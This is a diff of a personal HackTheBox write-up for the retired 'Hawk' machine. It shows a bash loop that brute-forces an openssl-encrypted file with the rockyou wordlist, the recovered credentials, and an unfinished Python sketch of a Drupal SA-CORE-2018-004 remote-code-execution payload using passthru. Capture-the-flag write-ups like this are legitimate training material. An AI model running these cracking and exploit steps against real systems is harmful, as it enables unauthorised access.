@@ -9,8 +9,10 @@ Learnt:
 - Drawning eletronic pictures is go for reporting, but pen and paper is supreme speed solving utility
 - Do stuff till last argement:`$?` does not equal 0; `... > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi;`
 
+
 ## Recon
 
+The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](HackTheBox/Retired-Machines/Hawk/Screenshots/ping.png)
 
 FTP - has .drupal.txt.enc
@@ -104,19 +106,63 @@ make
 ...
 ```
 
-Four hours of other activities in the foreground. No crack. 30 minutes threading in C forfeit, peak at solution move on to priv escalation for 40 minutes urgent privilege escalation, before 20 minutes if required, Helped-Throughed. Peaked at 
+Four hours of other activities in the foreground. No crack. 30 minutes threading in C forfeit, peak at solution move on to priv escalation for 40 minutes urgent privilege escalation, before 20 minutes if required, Helped-Throughed. Peaked at 0xDf
 
 ```bash
 cat /usr/share/wordlists/rockyou.txt | while read pass; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi; done;
 ```
 
 The important scripting lesson here writing the conditional and devnull to pass stderr to null.
-`... > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi;`
+`... > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi;`. Although this never work the bash scripting ideas was worth testing it and will be added to my notes on Useful Bash. [Python2 tool to bruteforce openssl ciphers against a wordlists bvy HrushikeshK](https://github.com/HrushikeshK/openssl-bruteforce)
 
+```bash
+python openssl-bruteforce/brute.py /usr/share/wordlists/rockyou.txt  openssl-bruteforce/ciphers.txt .drupal.txt.enc 2> /dev/null
+```
+
+![](cracked.png)
 
 ## Exploit
 
+Armed with:
+```go
+Password found with algorithm AES256: friends
+Data:
+Daniel,
 
+Following the password for the portal:
+
+PencilKeyboardScanner123
+
+Please let us know when the portal is ready.
+
+Kind Regards,
+
+IT department
+```
+
+From this point on I want to see if I can speed through this RCE without metasploit and privesc in forty-ish minutes, I am still going to set this to Helped-Through becuase picked the wrong tool and the script failed. Although I have found the RCE from prior needing help, I starred and follow the tool maker and think my recon for this box was stellar - cracking very subpar. Openssl, javascript and be as throughout the first time paralelled with nice linear task management is getting there.
+
+`admin : PencilKeyboardScanner123`
+![](admin-password.png)
+
+Baby step thinking out the exploit if python for one day exploit writing
+```python
+import requests 
+
+
+uri_path = http://10.129.95.193/
+drupal_node = 1
+drupal_session = # cookie 
+payload_enc
+"{uri_path}/?q=node/#{drupal_node}/delete&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=php%20-r%20'#{payload_enc}"
+```
+
+[Find the node number](https://ostraining.com/blog/drupal/find-node-id/)
+![](nodenumber.png)
+[Python3 Exploit](https://github.com/oways/SA-CORE-2018-004) 
+-  Returns .html, but my guess is that - testing with tcpdump is that the sites directory make the off-the-shelf-exploit not produce a RCE.
+
+An 1.5 hour of figgling around; Lesson dithering on the exploits.
 
 ## Foothold
 
